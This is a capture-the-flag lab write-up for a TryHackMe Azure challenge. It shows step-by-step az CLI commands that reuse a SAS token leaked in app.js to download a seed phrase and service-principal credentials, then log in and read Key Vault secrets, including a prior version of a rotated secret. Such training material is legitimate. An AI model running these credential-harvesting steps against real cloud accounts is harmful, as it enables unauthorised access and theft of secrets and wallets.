# Day 9 - CryptoCabana
## Room: <https://tryhackme.com/room/hh-cryptocabana-f81cac95>

Hello Hackers!

Welcome to Day 9 of the TryHackMe Hacker Holidays 2026 writeups.

This challenge involves Azure Storage, exposed SAS tokens, and Azure Key Vault secrets.

Inspecting `app.js` reveals an Azure Storage account and a SAS token:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=...";
```

We export the storage account and SAS token:

```bash
export AZURE_STORAGE_ACCOUNT="cryptocabanaf5scjagc"
export AZURE_STORAGE_SAS_TOKEN="..."
```

Listing the storage containers reveals:

- `$web`
- `backups`
- `vault`

The `vault` and `backups` containers look interesting, so we check the contents of the vault:

```bash
az storage blob list --container-name vault | grep name
```

This reveals two files:

```text
backup-service-account.json
seed_phrase.txt
```

The seed phrase file looks interesting, so we download both files:

```bash
az storage blob download \
--container-name vault \
--name seed_phrase.txt \
--file seed_phrase.txt

az storage blob download \
--container-name vault \
--name backup-service-account.json \
--file backup-service-account.json
```

The `seed_phrase.txt` file contains a 12-word seed phrase.

The JSON file contains the credentials for an Azure service principal, along with the name of an Azure Key Vault. We use those details to set the required environment variables and log in:

```bash
export AZURE_CLIENT_ID="..."
export AZURE_CLIENT_SECRET="..."
export AZURE_TENANT_ID="..."
export AZURE_VAULT_NAME="ccabana-kv-f5scjagc"

az login \
--service-principal \
--username "$AZURE_CLIENT_ID" \
--password "$AZURE_CLIENT_SECRET" \
--tenant "$AZURE_TENANT_ID" \
--allow-no-subscriptions \
--output none
```

Next, list the secrets in the Key Vault:

```bash
az keyvault secret list \
--vault-name "$AZURE_VAULT_NAME" | grep name
```

The vault contains:

```text
key-shard-1
key-shard-2
key-shard-3
master-key
```

The `master-key` is forbidden, but the three key shards can be accessed:

```bash
az keyvault secret show \
--vault-name "$AZURE_VAULT_NAME" \
--name key-shard-1 | grep value

az keyvault secret show \
--vault-name "$AZURE_VAULT_NAME" \
--name key-shard-2 | grep value

az keyvault secret show \
--vault-name "$AZURE_VAULT_NAME" \
--name key-shard-3 | grep value
```

The first and third shards reveal partial flag values. The second shard contains a message indicating that it was rotated and that the old value may still be recoverable.

Azure Key Vault keeps previous secret versions, so we list the versions of `key-shard-2`:

```bash
az keyvault secret list-versions \
--vault-name "$AZURE_VAULT_NAME" \
--name key-shard-2
```

The older version can then be retrieved using its version ID:

```bash
az keyvault secret show \
--vault-name "$AZURE_VAULT_NAME" \
--name key-shard-2 \
--version <old-version-id> | grep value
```

The old value completes the missing section of the flag.

Combining all three shards reveals the flag:

> `THM{...}`

Happy Hacking!
